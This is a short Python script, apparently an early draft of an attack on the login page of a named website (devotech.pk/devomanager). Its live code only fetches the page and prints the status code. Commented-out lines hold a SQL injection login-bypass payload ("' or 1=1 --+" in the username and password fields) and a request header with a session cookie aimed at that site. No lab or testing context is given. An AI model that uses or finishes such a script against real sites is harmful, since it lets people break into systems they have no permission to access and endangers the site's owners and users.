#!/usr/bin/python3
try:
	import requests
	h = "http://devotech.pk/devomanager/"
#	payload = {"username":"' or 1=1 --+","password":"' or 1=1 --+","submit":"Login"}
#	print(payload)
#	head = {"Cookie":"PHPSESSID=1a71e9a8a30b64c51eb531e45ef526db","Origin":"http://devotech.pk","Referer":"http://devotech.pk/devomanager/","User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0","Content-Type":"multipart/form-data; boundary=---------------------------72047722126342602081353605503"}
	r = requests.get(h, timeout=10)
	print(r.status_code)
#	print(r.text)
except Exception as er:
	print("Problem:", er)
